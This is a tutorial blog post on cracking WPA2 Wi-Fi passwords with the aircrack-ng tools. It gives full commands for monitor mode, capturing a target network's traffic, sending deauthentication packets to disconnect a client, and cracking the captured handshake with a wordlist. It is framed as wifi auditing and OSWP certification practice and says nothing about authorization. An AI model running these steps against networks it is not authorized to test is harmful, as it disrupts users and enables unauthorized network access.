---
layout: post
title:  "Hacking Wifi (cracking Handshake)"
author: erik
categories: [ Wifi ]
image: https://user-images.githubusercontent.com/47476901/132572928-786e2463-ba7a-460d-8195-6fab060b7f78.png
beforetoc: ""
toc: false
tags: [ Wifi ]
---
Cracking the Handshake

# Table of Contents
1. [Interface Configuration](#interfaces)
2. [Stop the Processes](#detenerprocesos)
3. [Monitor mode](#monitormode)
4. [Nearby Wifi networks](#wificonnections)
5. [View clients connected to the network](#clients)
6. [Deauthentication Directed](#deautenticacion)
7. [Password cracking](#descifrarpassword)
8. [Adapters for wifi auditing](#adaptadores)

---

### 1- Ifconfig (Interface Configuration) <a name="interfaces"></a>
![ifconfig](https://user-images.githubusercontent.com/47476901/132572799-6168d979-07c5-4dee-a167-24d62fc5abe2.png)
- **eth0**: Ethernet Interface
- **l0**: Loopback Interface
- **wlan0**: Wireless network interface.

### 2- Stop the active processes in use: <a name="detenerprocesos"></a>

```md
airmon-ng check kill
```
![airmonkill](https://user-images.githubusercontent.com/47476901/132572813-42ed54c0-cbe9-44b8-b2f4-194dcc86afbe.png)

### 3- Start monitor mode on wlan0. <a name="monitormode"></a>

```md
airmon-ng start wlan
```
![startwlan0](https://user-images.githubusercontent.com/47476901/132572832-a7c85f74-df34-4842-b17e-44f802ba4acd.png)

### 4- See all the wifi networks near you. <a name="wificonnections"></a>

```md
airodump-ng wlan0
```
With the command airodump-ng wlan0 we can visualize all the packets that are traveling in real time.

![airodump](https://user-images.githubusercontent.com/47476901/132572839-f43de30b-ddd4-4aca-a65d-280ce3b9bac6.png)

Identify the target:

![objetive](https://user-images.githubusercontent.com/47476901/132572844-402edfa2-89d2-425d-9f13-045547856723.png)

### 5- View the clients connected to the target network. <a name="clients"></a>

We would start using airodump-ng and filter as we wish.
We can see that there is a client connected.

![clients](https://user-images.githubusercontent.com/47476901/132572850-0a106579-fc25-4e5d-90af-4845caa6a5ea.png)

```md
airodump-ng --bssid 66:FB:F4:F6:38:9A wlan0 -w captura -c 1
```
- **-- bssid**: The bssid is "66:FB:F4:F6:38:9A" 
- **wlan0**: My monitored network card is wlan0
- **-w captura**: This will be the file in which the data will be written.
-  **-c 1**: It is in channel 1 as shown in this way"-c 1"  





### 6- Deauthentication Directed. <a name="deautenticacion"></a>
Disconnect clients connected to the network.
When the client tries to reconnect to the network we can start cracking the password as we will have the necessary package.

![disconnect_clients](https://user-images.githubusercontent.com/47476901/132572858-40057c38-7ab7-4e77-b3b9-d1a51c369871.png)

```md
aireplay-ng -0 10 -a 66:FB:F4:F6:38:9A wlan0
```

- **-0**: For deauthentication
- **10**: Number of deauthentication packages to be sent
- **-a**: The BSSID of the destination network.
- **wlan0**: Interface name



### 7- Password cracking <a name="descifrarpassword"></a>

![decrypt](https://user-images.githubusercontent.com/47476901/132572876-088d3181-09dc-447b-8213-749d148ad800.gif)

```md
aircrack-ng -a2 -b  66:FB:F4:F6:38:9A -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

- **-a**: -a2 for WPA2 and -a for WPA.
- **-b**: the BSSID of the destination network.
- **-w /usr/share/wordlists/rockyou.txt**: is the dictionary of the passwords we will use.
- **captura-01.cap**: is the file we need since it is where all the packets we have intercepted are located.

Finally we get the password:

![password](https://user-images.githubusercontent.com/47476901/132588909-138e4344-51cc-4172-827f-98a569313782.png)

## Adapters for wifi audits <a name="adaptadores"></a>
I recommend the Alpha Network adapters, they are of very good quality and are focused for this type of use.
I have used the AWUS036ACH it works perfectly and has plenty of power. 100% recommended for certification.
<a href="https://www.offensive-security.com/wifu-oswp/" target="_blank">OSWP</a>

![adapter](https://user-images.githubusercontent.com/47476901/150223892-27e6ec82-079c-4dfc-b0dc-ee534b67ee37.png)


Link to the official website where you can purchase these adapters.
- <a href="https://alfa-network.eu/wi-fi/wi-fi-adapters?product_list_order=price&product_list_dir=desc" target="_blank">Alpha Network</a>

If you have any problems installing the drivers you can see the following post where he explains how to solve the most common problems when installing the drivers.
- <a href="https://b3nj1-1.github.io/blog/wifi/2022/01/17/WIFI/" target="_blank">Install Drivers Solution</a>
